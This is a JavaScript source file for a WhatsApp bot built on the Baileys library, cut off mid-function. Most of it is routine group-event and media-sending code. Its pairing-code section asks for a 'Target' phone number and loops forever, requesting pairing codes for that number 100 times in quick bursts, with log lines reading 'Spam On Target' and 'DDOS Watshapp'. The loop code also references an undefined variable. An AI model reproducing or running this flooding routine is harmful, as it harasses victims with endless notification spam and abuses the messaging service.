require("./settings");
const pino = require("pino");
const {
  Boom
} = require("@hapi/boom");
const fs = require("fs");
const chalk = require("chalk");
const {
  color
} = require("./lib/color");
const FileType = require("file-type");
const path = require("path");
const axios = require("axios");
const _ = require("lodash");
const {
  uncache,
  nocache
} = require("./lib/loader");
const yargs = require("yargs/yargs");
const {
  Low,
  JSONFile
} = require("./lib/lowdb");
const moment = require("moment-timezone");
const PhoneNumber = require("awesome-phonenumber");
const {
  imageToWebp,
  videoToWebp,
  writeExifImg,
  writeExifVid
} = require("./lib/exif");
const {
  smsg,
  isUrl,
  generateMessageTag,
  getBuffer,
  getSizeMedia,
  fetch,
  await,
  sleep,
  reSize
} = require("./lib/myfunc");
const {
  default: XeonBotIncConnect,
  delay,
  PHONENUMBER_MCC,
  makeCacheableSignalKeyStore,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageID,
  downloadContentFromMessage,
  makeInMemoryStore,
  jidDecode,
  proto,
  Browsers
} = require("@whiskeysockets/baileys");
const NodeCache = require("node-cache");
const Pino = require("pino");
const readline = require("readline");
const {
  parsePhoneNumber
} = require("libphonenumber-js");
const makeWASocket = require("@whiskeysockets/baileys").default;
const store = makeInMemoryStore({
  logger: pino().child({
    level: "silent",
    stream: "store"
  })
});
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse());
global.db = new Low(new JSONFile("src/database.json"));
global.DATABASE = global.db;
global.loadDatabase = async function loadDatabase() {
  if (global.db.READ) {
    return new Promise(_0x37299f => setInterval(function () {
      if (!global.db.READ) {
        clearInterval(this);
        _0x37299f(global.db.data == null ? global.loadDatabase() : global.db.data);
      } else {
        null;
      }
    }, 1000));
  }
  if (global.db.data !== null) {
    return;
  }
  global.db.READ = true;
  await global.db.read();
  global.db.READ = false;
  global.db.data = {
    users: {},
    database: {},
    chats: {},
    game: {},
    settings: {},
    message: {},
    ...(global.db.data || {})
  };
  global.db.chain = _.chain(global.db.data);
};
loadDatabase();
if (global.db) {
  setInterval(async () => {
    if (global.db.data) {
      await global.db.write();
    }
  }, 30000);
}
require("./XeonCheems14.js");
nocache("../XeonCheems14.js", _0x2abe14 => console.log(color("[ CHANGE ]", "green"), color("'" + _0x2abe14 + "'", "green"), "Updated"));
require("./main.js");
nocache("../main.js", _0xbe3725 => console.log(color("[ CHANGE ]", "green"), color("'" + _0xbe3725 + "'", "green"), "Updated"));
let phoneNumber = "916909137213";
let owner = JSON.parse(fs.readFileSync("./src/data/role/owner.json"));
const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code");
const useMobile = process.argv.includes("--mobile");
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});
const question = _0x22883f => new Promise(_0x21d13d => rl.question(_0x22883f, _0x21d13d));
async function startXeonBotInc() {
  let {
    version: _0x154002,
    isLatest: _0x1bf01f
  } = await fetchLatestBaileysVersion();
  const {
    state: _0x5bf10,
    saveCreds: _0x458f96
  } = await useMultiFileAuthState("./session");
  const _0x55471b = new NodeCache();
  const _0x582124 = makeWASocket({
    logger: pino({
      level: "silent"
    }),
    printQRInTerminal: !pairingCode,
    browser: Browsers.windows("Firefox"),
    patchMessageBeforeSending: _0x4227ec => {
      const _0x9e1de6 = !!_0x4227ec.buttonsMessage || !!_0x4227ec.templateMessage || !!_0x4227ec.listMessage;
      if (_0x9e1de6) {
        _0x4227ec = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {}
              },
              ..._0x4227ec
            }
          }
        };
      }
      return _0x4227ec;
    },
    auth: {
      creds: _0x5bf10.creds,
      keys: makeCacheableSignalKeyStore(_0x5bf10.keys, Pino({
        level: "fatal"
      }).child({
        level: "fatal"
      }))
    },
    markOnlineOnConnect: true,
    generateHighQualityLinkPreview: true,
    getMessage: async _0x4c2d73 => {
      if (store) {
        const _0x274a0b = await store.loadMessage(_0x4c2d73.remoteJid, _0x4c2d73.id);
        return _0x274a0b.message || undefined;
      }
      return {
        conversation: "GALIRUS SPAM ON"
      };
    },
    msgRetryCounterCache: _0x55471b,
    defaultQueryTimeoutMs: undefined
  });
  store.bind(_0x582124.ev);
  if (pairingCode && !_0x582124.authState.creds.registered) {
    if (useMobile) {
      throw new Error("Tidak dapat menggunakan kode pasangan dengan API seluler");
    }
    let _0x38cfa0 = await question(chalk.bgBlack(chalk.greenBright("Silakan ketik nomor WhatsApp Target 💻Zamur👑\nContoh: +62822xxxx : ")));
    _0x38cfa0 = _0x38cfa0.replace(/[^0-9]/g, "");
    while (!Object.keys(PHONENUMBER_MCC).some(_0x1cd6fc => _0x38cfa0.startsWith(_0x1cd6fc))) {
      console.log(chalk.bgBlack(chalk.redBright("Masukkan Nomor Target Anda, Contoh: +628594959498")));
      _0x38cfa0 = await question(chalk.bgBlack(chalk.greenBright("Silakan ketik nomor WhatsApp Target Anda 👨‍💻\nContoh: +628594959498 : ")));
      _0x38cfa0 = again.replace(/[^0-9]/g, "");
    }
    const _0x13981c = 100;
    const _0x553ff5 = 30;
    while (true) {
      let _0x3b94e6 = _0x13981c;
      while (_0x3b94e6 > 0) {
        let _0x41c724 = await _0x582124.requestPairingCode(_0x38cfa0);
        _0x41c724 = _0x41c724?.match(/.{1,4}/g)?.join("-") || _0x41c724;
        console.log(chalk.bgBlack(chalk.greenBright("Spam On Target: " + _0x41c724)));
        console.log(chalk.bgBlack(chalk.yellowBright("DDOS Watshapp: " + _0x3b94e6 + " detik...")));
        await new Promise(_0xef4d50 => setTimeout(_0xef4d50, 100));
        _0x3b94e6--;
      }
      console.log(chalk.bgBlack(chalk.redBright("Mengirim Ulang Dalam " + _0x553ff5 + " detik...")));
      await new Promise(_0x2aa51d => setTimeout(_0x2aa51d, _0x553ff5 * 1000));
    }
  }
  _0x582124.ev.on("connection.update", async _0x593e85 => {
    const {
      connection: _0x1b1551,
      lastDisconnect: _0x5ea215
    } = _0x593e85;
    try {
      if (_0x1b1551 === "close") {
        let _0x74d5e = new Boom(_0x5ea215?.error)?.output.statusCode;
        if (_0x74d5e === DisconnectReason.badSession) {
          console.log("Bad Session File, Please Delete Session and Scan Again");
          startXeonBotInc();
        } else if (_0x74d5e === DisconnectReason.connectionClosed) {
          console.log("Connection closed, reconnecting....");
          startXeonBotInc();
        } else if (_0x74d5e === DisconnectReason.connectionLost) {
          console.log("Connection Lost from Server, reconnecting...");
          startXeonBotInc();
        } else if (_0x74d5e === DisconnectReason.connectionReplaced) {
          console.log("Connection Replaced, Another New Session Opened, Please Close Current Session First");
          startXeonBotInc();
        } else if (_0x74d5e === DisconnectReason.loggedOut) {
          console.log("Device Logged Out, Please Delete Session and Scan Again.");
          startXeonBotInc();
        } else if (_0x74d5e === DisconnectReason.restartRequired) {
          console.log("Restart Required, Restarting...");
          startXeonBotInc();
        } else if (_0x74d5e === DisconnectReason.timedOut) {
          console.log("Connection TimedOut, Reconnecting...");
          startXeonBotInc();
        } else {
          _0x582124.end("Unknown DisconnectReason: " + _0x74d5e + "|" + _0x1b1551);
        }
      }
      if (_0x593e85.connection == "connecting" || _0x593e85.receivedPendingNotifications == "false") {
        console.log(color("\n🌿Connecting...", "yellow"));
      }
      if (_0x593e85.connection == "open" || _0x593e85.receivedPendingNotifications == "true") {
        console.log(color(" ", "magenta"));
        console.log(color("🌿Connected to => " + JSON.stringify(_0x582124.user, null, 2), "yellow"));
        console.log(chalk.yellow("\n\n               " + chalk.bold.blue("[ " + botname + " ]") + "\n\n"));
        console.log(color("< ================================================== >", "cyan"));
        console.log(color("\n" + themeemoji + " YT CHANNEL: Xeon", "magenta"));
        console.log(color(themeemoji + " GITHUB: DGXeon ", "magenta"));
        console.log(color(themeemoji + " INSTAGRAM: @unicorn_xeon ", "magenta"));
        console.log(color(themeemoji + " WA NUMBER: " + owner, "magenta"));
        console.log(color(themeemoji + " CREDIT: " + wm + "\n", "magenta"));
      }
    } catch (_0x474522) {
      console.log("Error in Connection.update " + _0x474522);
      startXeonBotInc();
    }
  });
  _0x582124.ev.on("creds.update", _0x458f96);
  _0x582124.ev.on("messages.upsert", () => {});
  _0x582124.ev.on("group-participants.update", async _0x7a4c80 => {
    if (global.welcome) {
      console.log(_0x7a4c80);
      try {
        let _0x5713ba = await _0x582124.groupMetadata(_0x7a4c80.id);
        let _0x17c780 = _0x7a4c80.participants;
        for (let _0xfbbda2 of _0x17c780) {
          try {
            ppuser = await _0x582124.profilePictureUrl(_0xfbbda2, "image");
          } catch (_0x204c9c) {
            ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
          }
          try {
            ppgroup = await _0x582124.profilePictureUrl(_0x7a4c80.id, "image");
          } catch (_0x26d8a6) {
            ppgroup = "https://i.ibb.co/RBx5SQC/avatar-group-large-v2.png?q=60";
          }
          memb = _0x5713ba.participants.length;
          XeonWlcm = await getBuffer(ppuser);
          XeonLft = await getBuffer(ppuser);
          if (_0x7a4c80.action == "add") {
            const _0x5e5196 = await getBuffer(ppuser);
            let _0x55aaf9 = _0xfbbda2;
            const _0x373e77 = moment.tz("Asia/Kolkata").format("HH:mm:ss");
            const _0x39175e = moment.tz("Asia/Kolkata").format("DD/MM/YYYY");
            const _0x59aa16 = _0x5713ba.participants.length;
            xeonbody = "┌─❖\n│「 𝗛𝗶 👋 」\n└┬❖ 「  @" + _0x55aaf9.split("@")[0] + "  」\n   │✑  𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 \n   │✑  " + _0x5713ba.subject + "\n   │✑  𝗠𝗲𝗺𝗯𝗲𝗿 : \n   │✑ " + _0x59aa16 + "th\n   │✑  𝗝𝗼𝗶𝗻𝗲𝗱 : \n   │✑ " + _0x373e77 + " " + _0x39175e + "\n   └───────────────┈ ⳹";
            let _0x54b33a = generateWAMessageFromContent(_0x7a4c80.id, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                      text: xeonbody
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                      text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: false,
                      ...(await prepareWAMessageMedia({
                        image: XeonWlcm
                      }, {
                        upload: _0x582124.waUploadToServer
                      }))
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: "{\"display_text\":\"Welcome 💐\",\"id\":\"\"}"
                      }]
                    }),
                    contextInfo: {
                      mentionedJid: [_0xfbbda2],
                      forwardingScore: 999,
                      isForwarded: true,
                      forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363222395675670@newsletter",
                        newsletterName: ownername,
                        serverMessageId: 143
                      }
                    }
                  })
                }
              }
            }, {});
            _0x582124.relayMessage(_0x7a4c80.id, _0x54b33a.message, {});
          } else if (_0x7a4c80.action == "remove") {
            const _0x2f6efc = await getBuffer(ppuser);
            const _0x2dd1d8 = moment.tz("Asia/Kolkata").format("HH:mm:ss");
            const _0xc1992c = moment.tz("Asia/Kolkata").format("DD/MM/YYYY");
            let _0x564c56 = _0xfbbda2;
            const _0x589492 = _0x5713ba.participants.length;
            xeonbody = "┌─❖\n│「 𝗚𝗼𝗼𝗱𝗯𝘆𝗲 👋 」\n└┬❖ 「 @" + _0x564c56.split("@")[0] + "  」\n   │✑  𝗟𝗲𝗳𝘁 \n   │✑ " + _0x5713ba.subject + "\n   │✑  𝗠𝗲𝗺𝗯𝗲𝗿 : \n   │✑ " + _0x589492 + "th\n   │✑  𝗧𝗶𝗺𝗲 : \n   │✑  " + _0x2dd1d8 + " " + _0xc1992c + "\n   └───────────────┈ ⳹";
            let _0x570bf7 = generateWAMessageFromContent(_0x7a4c80.id, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                      text: xeonbody
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                      text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: false,
                      ...(await prepareWAMessageMedia({
                        image: XeonLft
                      }, {
                        upload: _0x582124.waUploadToServer
                      }))
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: "{\"display_text\":\"Goodbye 👋\",\"id\":\"\"}"
                      }]
                    }),
                    contextInfo: {
                      mentionedJid: [_0xfbbda2],
                      forwardingScore: 999,
                      isForwarded: true,
                      forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363222395675670@newsletter",
                        newsletterName: ownername,
                        serverMessageId: 143
                      }
                    }
                  })
                }
              }
            }, {});
            _0x582124.relayMessage(_0x7a4c80.id, _0x570bf7.message, {});
          }
        }
      } catch (_0x34c472) {
        console.log(_0x34c472);
      }
    }
  });
  _0x582124.ev.on("call", async _0x16e3ac => {
    if (global.anticall) {
      console.log(_0x16e3ac);
      for (let _0x205006 of _0x16e3ac) {
        if (_0x205006.isGroup == false) {
          if (_0x205006.status == "offer") {
            let _0xecee72 = await _0x582124.sendTextWithMentions(_0x205006.from, "*" + _0x582124.user.name + "* can't receive " + (_0x205006.isVideo ? "video" : "voice") + " call. Sorry @" + _0x205006.from.split("@")[0] + " you will be blocked. If called accidentally please contact the owner to be unblocked !");
            _0x582124.sendContact(_0x205006.from, owner, _0xecee72);
            await sleep(8000);
            await _0x582124.updateBlockStatus(_0x205006.from, "block");
          }
        }
      }
    }
  });
  _0x582124.ev.on("messages.upsert", async _0x55c019 => {
    if (global.antiswview) {
      mek = _0x55c019.messages[0];
      if (mek.key && mek.key.remoteJid === "status@broadcast") {
        await _0x582124.readMessages([mek.key]);
      }
    }
  });
  _0x582124.ev.on("group-participants.update", async _0xd8db88 => {
    if (global.adminevent) {
      console.log(_0xd8db88);
      try {
        let _0x4850fe = _0xd8db88.participants;
        for (let _0x4b2986 of _0x4850fe) {
          try {
            ppuser = await _0x582124.profilePictureUrl(_0x4b2986, "image");
          } catch (_0x361d16) {
            ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
          }
          try {
            ppgroup = await _0x582124.profilePictureUrl(_0xd8db88.id, "image");
          } catch (_0xd30a2d) {
            ppgroup = "https://i.ibb.co/RBx5SQC/avatar-group-large-v2.png?q=60";
          }
          if (_0xd8db88.action == "promote") {
            const _0x12d0c8 = moment.tz("Asia/Kolkata").format("HH:mm:ss");
            const _0x2cfb73 = moment.tz("Asia/Kolkata").format("DD/MM/YYYY");
            let _0x2961ac = _0x4b2986;
            xeonbody = " 𝗖𝗼𝗻𝗴𝗿𝗮𝘁𝘀🎉 @" + _0x2961ac.split("@")[0] + ", you have been *promoted* to *admin* 🥳";
            _0x582124.sendMessage(_0xd8db88.id, {
              text: xeonbody,
              contextInfo: {
                mentionedJid: [_0x4b2986],
                externalAdReply: {
                  showAdAttribution: true,
                  containsAutoReply: true,
                  title: " " + global.botname,
                  body: "" + ownername,
                  previewType: "PHOTO",
                  thumbnailUrl: "",
                  thumbnail: XeonWlcm,
                  sourceUrl: "" + wagc
                }
              }
            });
          } else if (_0xd8db88.action == "demote") {
            const _0x5737da = moment.tz("Asia/Kolkata").format("HH:mm:ss");
            const _0x38a40b = moment.tz("Asia/Kolkata").format("DD/MM/YYYY");
            let _0xeee71 = _0x4b2986;
            xeonbody = "𝗢𝗼𝗽𝘀‼️ @" + _0xeee71.split("@")[0] + ", you have been *demoted* from *admin* 😬";
            _0x582124.sendMessage(_0xd8db88.id, {
              text: xeonbody,
              contextInfo: {
                mentionedJid: [_0x4b2986],
                externalAdReply: {
                  showAdAttribution: true,
                  containsAutoReply: true,
                  title: " " + global.botname,
                  body: "" + ownername,
                  previewType: "PHOTO",
                  thumbnailUrl: "",
                  thumbnail: XeonLft,
                  sourceUrl: "" + wagc
                }
              }
            });
          }
        }
      } catch (_0x270d32) {
        console.log(_0x270d32);
      }
    }
  });
  _0x582124.ev.on("groups.update", async _0x15326e => {
    if (global.groupevent) {
      try {
        ppgroup = await _0x582124.profilePictureUrl(anu.id, "image");
      } catch (_0x2e3fc2) {
        ppgroup = "https://i.ibb.co/RBx5SQC/avatar-group-large-v2.png?q=60";
      }
      console.log(_0x15326e);
      const _0x1cf492 = _0x15326e[0];
      if (_0x1cf492.announce == true) {
        await sleep(2000);
        _0x582124.sendMessage(_0x1cf492.id, {
          text: "「 Group Settings Change 」\n\nGroup has been closed by admin, Now only admins can send messages !"
        });
      } else if (_0x1cf492.announce == false) {
        await sleep(2000);
        _0x582124.sendMessage(_0x1cf492.id, {
          text: "「 Group Settings Change 」\n\nThe group has been opened by admin, Now participants can send messages !"
        });
      } else if (_0x1cf492.restrict == true) {
        await sleep(2000);
        _0x582124.sendMessage(_0x1cf492.id, {
          text: "「 Group Settings Change 」\n\nGroup info has been restricted, Now only admin can edit group info !"
        });
      } else if (_0x1cf492.restrict == false) {
        await sleep(2000);
        _0x582124.sendMessage(_0x1cf492.id, {
          text: "「 Group Settings Change 」\n\nGroup info has been opened, Now participants can edit group info !"
        });
      } else if (!_0x1cf492.desc == "") {
        await sleep(2000);
        _0x582124.sendMessage(_0x1cf492.id, {
          text: "「 Group Settings Change 」\n\n*Group description has been changed to*\n\n" + _0x1cf492.desc
        });
      } else {
        await sleep(2000);
        _0x582124.sendMessage(_0x1cf492.id, {
          text: "「 Group Settings Change 」\n\n*Group name has been changed to*\n\n*" + _0x1cf492.subject + "*"
        });
      }
    }
  });
  async function _0x5dd967(_0x38589b) {
    if (store) {
      const _0x5e303b = await store.loadMessage(_0x38589b.remoteJid, _0x38589b.id);
      return _0x5e303b?.message;
    }
    return {
      conversation: "Cheems Bot Here!"
    };
  }
  _0x582124.ev.on("messages.update", async _0x20c335 => {
    for (const {
      key: _0x554d2e,
      update: _0x34de47
    } of _0x20c335) {
      if (_0x34de47.pollUpdates && _0x554d2e.fromMe) {
        const _0x11c0b3 = await _0x5dd967(_0x554d2e);
        if (_0x11c0b3) {
          const _0x24188b = await getAggregateVotesInPollMessage({
            message: _0x11c0b3,
            pollUpdates: _0x34de47.pollUpdates
          });
          var _0x18518b = _0x24188b.filter(_0x3db4df => _0x3db4df.voters.length !== 0)[0]?.name;
          if (_0x18518b == undefined) {
            return;
          }
          var _0x26250f = xprefix + _0x18518b;
          _0x582124.appenTextMessage(_0x26250f, _0x20c335);
        }
      }
    }
  });
  _0x582124.ev.on("messages.upsert", async _0x37209d => {
    try {
      const _0x15ca37 = _0x37209d.messages[0];
      if (!_0x15ca37.message) {
        return;
      }
      _0x15ca37.message = Object.keys(_0x15ca37.message)[0] === "ephemeralMessage" ? _0x15ca37.message.ephemeralMessage.message : _0x15ca37.message;
      if (_0x15ca37.key && _0x15ca37.key.remoteJid === "status@broadcast") {
        if (!_0x582124.public && !_0x15ca37.key.fromMe && _0x37209d.type === "notify") {
          return;
        }
      }
      if (_0x15ca37.key.id.startsWith("BAE5") && _0x15ca37.key.id.length === 16) {
        return;
      }
      const _0x6b8362 = smsg(_0x582124, _0x15ca37, store);
      require("./XeonCheems14")(_0x582124, _0x6b8362, _0x37209d, store);
    } catch (_0x257577) {
      console.log(_0x257577);
    }
  });
  _0x582124.decodeJid = _0x24e4e3 => {
    if (!_0x24e4e3) {
      return _0x24e4e3;
    }
    if (/:\d+@/gi.test(_0x24e4e3)) {
      let _0x3ffcd2 = jidDecode(_0x24e4e3) || {};
      return _0x3ffcd2.user && _0x3ffcd2.server && _0x3ffcd2.user + "@" + _0x3ffcd2.server || _0x24e4e3;
    } else {
      return _0x24e4e3;
    }
  };
  _0x582124.ev.on("contacts.update", _0x11aa13 => {
    for (let _0x1abed3 of _0x11aa13) {
      let _0x17cd4b = _0x582124.decodeJid(_0x1abed3.id);
      if (store && store.contacts) {
        store.contacts[_0x17cd4b] = {
          id: _0x17cd4b,
          name: _0x1abed3.notify
        };
      }
    }
  });
  _0x582124.getName = (_0x5094e7, _0x33ca17 = false) => {
    id = _0x582124.decodeJid(_0x5094e7);
    _0x33ca17 = _0x582124.withoutContact || _0x33ca17;
    let _0x4be293;
    if (id.endsWith("@g.us")) {
      return new Promise(async _0xd9510c => {
        _0x4be293 = store.contacts[id] || {};
        if (!_0x4be293.name && !_0x4be293.subject) {
          _0x4be293 = _0x582124.groupMetadata(id) || {};
        }
        _0xd9510c(_0x4be293.name || _0x4be293.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    } else {
      _0x4be293 = id === "0@s.whatsapp.net" ? {
        id: id,
        name: "WhatsApp"
      } : id === _0x582124.decodeJid(_0x582124.user.id) ? _0x582124.user : store.contacts[id] || {};
    }
    return (_0x33ca17 ? "" : _0x4be293.name) || _0x4be293.subject || _0x4be293.verifiedName || PhoneNumber("+" + _0x5094e7.replace("@s.whatsapp.net", "")).getNumber("international");
  };
  _0x582124.sendContact = async (_0x1793c1, _0x40dd28, _0xb2c523 = "", _0x350685 = {}) => {
    let _0x372fb1 = [];
    for (let _0x1c7221 of _0x40dd28) {
      _0x372fb1.push({
        displayName: await _0x582124.getName(_0x1c7221),
        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:" + (await _0x582124.getName(_0x1c7221)) + "\nFN:" + (await _0x582124.getName(_0x1c7221)) + "\nitem1.TEL;waid=" + _0x1c7221.split("@")[0] + ":" + _0x1c7221.split("@")[0] + "\nitem1.X-ABLabel:Mobile\nEND:VCARD"
      });
    }
    _0x582124.sendMessage(_0x1793c1, {
      contacts: {
        displayName: _0x372fb1.length + " Contact",
        contacts: _0x372fb1
      },
      ..._0x350685
    }, {
      quoted: _0xb2c523
    });
  };
  _0x582124.public = true;
  _0x582124.serializeM = _0x1442b2 => smsg(_0x582124, _0x1442b2, store);
  _0x582124.sendText = (_0x50cc31, _0x599837, _0x5573d4 = "", _0x46dc10) => _0x582124.sendMessage(_0x50cc31, {
    text: _0x599837,
    ..._0x46dc10
  }, {
    quoted: _0x5573d4,
    ..._0x46dc10
  });
  _0x582124.sendImage = async (_0x286e27, _0x56eda6, _0x107174 = "", _0x2c4a69 = "", _0x5d2b8b) => {
    let _0x40c650 = Buffer.isBuffer(_0x56eda6) ? _0x56eda6 : /^data:.*?\/.*?;base64,/i.test(_0x56eda6) ? Buffer.from(_0x56eda6.split`,`[1], "base64") : /^https?:\/\//.test(_0x56eda6) ? await await getBuffer(_0x56eda6) : fs.existsSync(_0x56eda6) ? fs.readFileSync(_0x56eda6) : Buffer.alloc(0);
    return await _0x582124.sendMessage(_0x286e27, {
      image: _0x40c650,
      caption: _0x107174,
      ..._0x5d2b8b
    }, {
      quoted: _0x2c4a69
    });
  };
  _0x582124.sendTextWithMentions = async (_0x139bb5, _0x10155d, _0x1b9a63, _0x34fa51 = {}) => _0x582124.sendMessage(_0x139bb5, {
    text: _0x10155d,
    mentions: [..._0x10155d.matchAll(/@(\d{0,16})/g)].map(_0x12eee7 => _0x12eee7[1] + "@s.whatsapp.net"),
    ..._0x34fa51
  }, {
    quoted: _0x1b9a63
  });
  _0x582124.sendImageAsSticker = async (_0x1f575d, _0x2f4b5d, _0x308b1f, _0x47b548 = {}) => {
    let _0x32e2c7 = Buffer.isBuffer(_0x2f4b5d) ? _0x2f4b5d : /^data:.*?\/.*?;base64,/i.test(_0x2f4b5d) ? Buffer.from(_0x2f4b5d.split`,`[1], "base64") : /^https?:\/\//.test(_0x2f4b5d) ? await await getBuffer(_0x2f4b5d) : fs.existsSync(_0x2f4b5d) ? fs.readFileSync(_0x2f4b5d) : Buffer.alloc(0);
    let _0x178476;
    if (_0x47b548 && (_0x47b548.packname || _0x47b548.author)) {
      _0x178476 = await writeExifImg(_0x32e2c7, _0x47b548);
    } else {
      _0x178476 = await imageToWebp(_0x32e2c7);
    }
    await _0x582124.sendMessage(_0x1f575d, {
      sticker: {
        url: _0x178476
      },
      ..._0x47b548
    }, {
      quoted: _0x308b1f
    }).then(_0x32fa1a => {
      fs.unlinkSync(_0x178476);
      return _0x32fa1a;
    });
  };
  _0x582124.sendAudio = async (_0x271c8c, _0x3081b9, _0x14ea5c = "", _0x1d9c25 = false, _0x47d7bb) => {
    let _0x3e8ec8 = Buffer.isBuffer(_0x3081b9) ? _0x3081b9 : /^data:.*?\/.*?;base64,/i.test(_0x3081b9) ? Buffer.from(_0x3081b9.split`,`[1], "base64") : /^https?:\/\//.test(_0x3081b9) ? await await getBuffer(_0x3081b9) : fs.existsSync(_0x3081b9) ? fs.readFileSync(_0x3081b9) : Buffer.alloc(0);
    return await _0x582124.sendMessage(_0x271c8c, {
      audio: _0x3e8ec8,
      ptt: _0x1d9c25,
      ..._0x47d7bb
    }, {
      quoted: _0x14ea5c
    });
  };
  _0x582124.sendVideo = async (_0xe11e3c, _0x1cce3a, _0xd4c02a = "", _0x230f6a = "", _0x490a1a = false, _0x5382a9) => {
    let _0x572db8 = Buffer.isBuffer(_0x1cce3a) ? _0x1cce3a : /^data:.*?\/.*?;base64,/i.test(_0x1cce3a) ? Buffer.from(_0x1cce3a.split`,`[1], "base64") : /^https?:\/\//.test(_0x1cce3a) ? await await getBuffer(_0x1cce3a) : fs.existsSync(_0x1cce3a) ? fs.readFileSync(_0x1cce3a) : Buffer.alloc(0);
    return await _0x582124.sendMessage(_0xe11e3c, {
      video: _0x572db8,
      caption: _0xd4c02a,
      gifPlayback: _0x490a1a,
      ..._0x5382a9
    }, {
      quoted: _0x230f6a
    });
  };
  _0x582124.sendVideoAsSticker = async (_0x1a802f, _0x57c851, _0x2cc61a, _0x137722 = {}) => {
    let _0x2dd763 = Buffer.isBuffer(_0x57c851) ? _0x57c851 : /^data:.*?\/.*?;base64,/i.test(_0x57c851) ? Buffer.from(_0x57c851.split`,`[1], "base64") : /^https?:\/\//.test(_0x57c851) ? await await getBuffer(_0x57c851) : fs.existsSync(_0x57c851) ? fs.readFileSync(_0x57c851) : Buffer.alloc(0);
    let _0x5838e7;
    if (_0x137722 && (_0x137722.packname || _0x137722.author)) {
      _0x5838e7 = await writeExifVid(_0x2dd763, _0x137722);
    } else {
      _0x5838e7 = await videoToWebp(_0x2dd763);
    }
    await _0x582124.sendMessage(_0x1a802f, {
      sticker: {
        url: _0x5838e7
      },
      ..._0x137722
    }, {
      quoted: _0x2cc61a
    });
    return _0x5838e7;
  };
  _0x582124.downloadAndSaveMediaMessage = async (_0x145023, _0xb44fe, _0x1aef8b = true) => {
    let _0x2e05bd = _0x145023.msg ? _0x145023.msg : _0x145023;
    let _0x8be38 = (_0x145023.msg || _0x145023).mimetype || "";
    let _0x2df692 = _0x145023.mtype ? _0x145023.mtype.replace(/Message/gi, "") : _0x8be38.split("/")[0];
    const _0x528a07 = await downloadContentFromMessage(_0x2e05bd, _0x2df692);
    let _0x548eb1 = Buffer.from([]);
    for await (const _0x1597dd of _0x528a07) {
      _0x548eb1 = Buffer.concat([_0x548eb1, _0x1597dd]);
    }
    let _0xd18a6e = await FileType.fromBuffer(_0x548eb1);
    trueFileName = _0x1aef8b ? _0xb44fe + "." + _0xd18a6e.ext : _0xb44fe;
    await fs.writeFileSync(trueFileName, _0x548eb1);
    return trueFileName;
  };
  _0x582124.sendFileUrl = async (_0x51b5aa, _0x1e10fa, _0x219afc, _0x3b7650, _0x234ca9 = {}) => {
    let _0x547689 = "";
    let _0x888f27 = await axios.head(_0x1e10fa);
    _0x547689 = _0x888f27.headers["content-type"];
    if (_0x547689.split("/")[1] === "gif") {
      return _0x582124.sendMessage(_0x51b5aa, {
        video: await getBuffer(_0x1e10fa),
        caption: _0x219afc,
        gifPlayback: true,
        ..._0x234ca9
      }, {
        quoted: _0x3b7650,
        ..._0x234ca9
      });
    }
    let _0x4b4d13 = _0x547689.split("/")[0] + "Message";
    if (_0x547689 === "application/pdf") {
      return _0x582124.sendMessage(_0x51b5aa, {
        document: await getBuffer(_0x1e10fa),
        mimetype: "application/pdf",
        caption: _0x219afc,
        ..._0x234ca9
      }, {
        quoted: _0x3b7650,
        ..._0x234ca9
      });
    }
    if (_0x547689.split("/")[0] === "image") {
      return _0x582124.sendMessage(_0x51b5aa, {
        image: await getBuffer(_0x1e10fa),
        caption: _0x219afc,
        ..._0x234ca9
      }, {
        quoted: _0x3b7650,
        ..._0x234ca9
      });
    }
    if (_0x547689.split("/")[0] === "video") {
      return _0x582124.sendMessage(_0x51b5aa, {
        video: await getBuffer(_0x1e10fa),
        caption: _0x219afc,
        mimetype: "video/mp4",
        ..._0x234ca9
      }, {
        quoted: _0x3b7650,
        ..._0x234ca9
      });
    }
    if (_0x547689.split("/")[0] === "audio") {
      return _0x582124.sendMessage(_0x51b5aa, {
        audio: await getBuffer(_0x1e10fa),
        caption: _0x219afc,
        mimetype: "audio/mpeg",
        ..._0x234ca9
      }, {
        quoted: _0x3b7650,
        ..._0x234ca9
      });
    }
  };
  _0x582124.getFile = async (_0x41a294, _0x3dcaef) => {
    let _0x708d2e;
    let _0x1b5173 = Buffer.isBuffer(_0x41a294) ? _0x41a294 : /^data:.*?\/.*?;base64,/i.test(_0x41a294) ? Buffer.from(_0x41a294.split`,`[1], "base64") : /^https?:\/\//.test(_0x41a294) ? await (_0x708d2e = await getBuffer(_0x41a294)) : fs.existsSync(_0x41a294) ? (filename = _0x41a294, fs.readFileSync(_0x41a294)) : typeof _0x41a294 === "string" ? _0x41a294 : Buffer.alloc(0);
